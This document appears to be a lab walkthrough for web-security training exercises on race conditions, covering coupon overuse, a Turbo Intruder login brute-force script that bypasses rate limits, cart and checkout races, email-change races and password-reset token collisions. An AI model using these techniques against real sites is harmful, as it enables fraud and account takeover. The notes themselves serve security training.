### Limit overrun race conditions

In this exercise you'll learn how to send several gifts coupons. Send the POST /cart/coupon to repeater, duplicate 19 times, and send requests in sequence until you have enough discount and can buy the jacket

---
### Bypassing rate limits via race conditions

Try to log in with the credentials, but input a wrong password.

In the POST /login request, highlight the password field and select Extensions > Turbo Intruder > Send to turbo intruder
Change the username for "carlos" and use this python code:
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

Copy the password list to your clipboard, and start the attack. You should see a 302 response. That's Carlos password.
Log in and delete the account.

---
### Multi-endpoint race conditions

Send the /cart and /cart/checkout to repeater, create a tab group. 

Set the /cart to add the productId=1 (the jacket), and then send the requests in parallel. Repeat until it's solved. 

---
### Single-endpoint race conditions

Send two requests to POST /my-account/change-email to the repeater, and create a tab group

In one request, cange the email parameter to `anything@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net` and the other to `carlos@ginandjuice.shop` 

Send it until you receive the change confirmation for the carlos email address. Click the link on the email server, and then refresh your home page. 
You'll see the admin panel, delete Carlos account.

---
### Exploiting time-sensitive vulnerabilities

Go to the forgot password functionality, complete the values for your user, and send the POST /forgot-password to the repeater. Send 2 of this requests. 
To get a different phpsessionid and csrf value, send a GET /forgot-password without any cookie, and copy the csrf and cookie values in the response. 
Use that values to the 2nd request to POST /forgot-password, and in the second one, change the username to carlos.

Send the request in parallel until you receive the same code for both users.
To validate, paste the url you get in the browser, and replace the username with "carlos". If you go to the change password window, it worked. 

`https://0af4008503995d5482a5fb30001500a6.web-security-academy.net/forgot-password?user=<USER-NAME>&token=80a4d07a9da468a2eba6be57208d60d9a7df094d`